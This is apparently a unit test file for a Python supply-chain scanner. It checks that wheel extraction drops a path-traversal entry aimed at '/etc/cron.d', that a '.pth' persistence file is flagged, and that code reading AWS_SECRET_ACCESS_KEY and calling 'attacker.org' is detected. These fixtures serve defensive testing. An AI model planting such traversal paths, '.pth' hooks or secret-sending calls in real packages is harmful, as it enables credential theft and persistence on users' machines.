"""Unit tests for PyPI ecosystem support, wheel extractor, and python rules."""

import io
import unittest
import zipfile

from bumpguard.analyze.python_analyzer import PythonFactExtractor
from bumpguard.core.types import Context, Ecosystem, FactKind, PackageRef
from bumpguard.extract.safe_extractor import ExtractedArchive, ExtractedFile
from bumpguard.extract.wheel_extractor import SafeWheelExtractor
from bumpguard.lockfile.pypi_parser import parse_requirements_txt


def _create_wheel_zip(files_dict) -> bytes:
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, mode="w") as zf:
        for name, content in files_dict.items():
            zf.writestr(name, content)
    return bio.getvalue()


class TestPyPI(unittest.TestCase):
    def test_wheel_safe_extraction(self):
        whl_bytes = _create_wheel_zip({
            "my_lib/__init__.py": "print('hello')",
            "../../etc/cron.d/evil": "malicious",
        })

        extractor = SafeWheelExtractor()
        archive = extractor.extract_wheel(whl_bytes)

        self.assertIn("my_lib/__init__.py", archive.files)
        self.assertNotIn("../../etc/cron.d/evil", archive.files)

    def test_python_fact_patterns_and_pth(self):
        archive = ExtractedArchive(
            files={
                "backdoor.pth": ExtractedFile("backdoor.pth", b"import evil", "hash1", 11),
                "my_lib/core.py": ExtractedFile(
                    "my_lib/core.py",
                    b"""
                    import requests
                    import subprocess
                    token = os.environ['AWS_SECRET_ACCESS_KEY']
                    subprocess.run(['ls'])
                    requests.get('https://attacker.org')
                    """,
                    "hash2",
                    150,
                ),
            },
            total_uncompressed_bytes=161,
            file_count=2,
        )

        py_extractor = PythonFactExtractor()
        pkg = PackageRef(Ecosystem.PYPI, "trojan-lib", "1.0.0", "1.1.0")

        # Test .pth persistence detection (BG-EXEC-003)
        pth_findings = py_extractor.check_pth_files(archive, pkg)
        self.assertEqual(len(pth_findings), 1)
        self.assertEqual(pth_findings[0].rule_id, "BG-EXEC-003")

        # Test code facts
        facts = py_extractor.extract_file_facts(archive.files["my_lib/core.py"], Context.Import)
        rule_ids = {cf.rule_id for cf in facts}
        self.assertIn("BG-CODE-001", rule_ids) # requests
        self.assertIn("BG-CODE-002", rule_ids) # subprocess
        self.assertIn("BG-CODE-005", rule_ids) # AWS_SECRET_ACCESS_KEY

    def test_parse_requirements_txt(self):
        content = """
        requests==2.31.0
        urllib3 == 2.0.7 # pinned
        # comment line
        flask==3.0.0
        """
        entries = parse_requirements_txt(content)
        self.assertIn("requests", entries)
        self.assertEqual(entries["requests"].version, "2.31.0")
        self.assertIn("urllib3", entries)
        self.assertEqual(entries["urllib3"].version, "2.0.7")
        self.assertIn("flask", entries)
        self.assertEqual(entries["flask"].version, "3.0.0")


if __name__ == "__main__":
    unittest.main()
